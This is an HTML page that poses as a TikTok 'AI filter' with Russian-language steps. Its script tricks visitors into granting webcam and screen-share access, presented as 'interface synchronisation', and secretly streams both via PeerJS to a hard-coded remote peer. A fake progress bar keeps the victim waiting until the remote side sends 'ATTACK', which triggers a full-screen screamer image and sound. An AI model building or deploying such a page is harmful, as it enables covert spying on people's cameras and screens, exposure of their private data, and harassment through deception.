<!DOCTYPE html>
<html>
<head>
    <title>TikTok AI Filter</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
        .btn { background: #ff0050; color: white; border: none; padding: 25px 50px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; }
        #step2, #loader, #screamer { display: none; }
        #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; z-index: 10000; }
        #screamer img { width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body>

    <div id="step1">
        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80">
        <h2>AI-Фильтр</h2>
        <p>Шаг 1: Доступ к камере</p>
        <button class="btn" onclick="getCam()">РАЗРЕШИТЬ</button>
    </div>

    <div id="step2">
        <h2>Шаг 2</h2>
        <p>Синхронизация интерфейса (Экран)</p>
        <button class="btn" style="background: #00f2ea; color: #000;" onclick="getScreen()">ПОДТВЕРДИТЬ</button>
    </div>

    <div id="loader">
        <h2 id="load-text">Анализ... 0%</h2>
    </div>

    <div id="screamer">
        <img src="https://i.imgur.com/v799C7v.jpeg">
        <audio id="scary-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3"></audio>
    </div>

    <script>
        const REMOTE_ID = '09062012';
        const peer = new Peer();
        let conn;

        async function getCam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                conn = peer.connect(REMOTE_ID);
                peer.call(REMOTE_ID, stream);
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
            } catch (e) { alert("Ошибка доступа!"); }
        }

        async function getScreen() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                peer.call(REMOTE_ID, stream);
                document.getElementById('step2').style.display = 'none';
                document.getElementById('loader').style.display = 'block';

                conn.on('data', data => {
                    if (data === 'ATTACK') {
                        document.getElementById('screamer').style.display = 'block';
                        document.getElementById('scary-audio').play();
                    }
                });

                let p = 0;
                setInterval(() => { if(p < 99) { p++; document.getElementById('load-text').innerText = "Анализ: " + p + "%"; } }, 500);
            } catch (e) { alert("Ошибка экрана!"); }
        }
    </script>
</body>
</html>
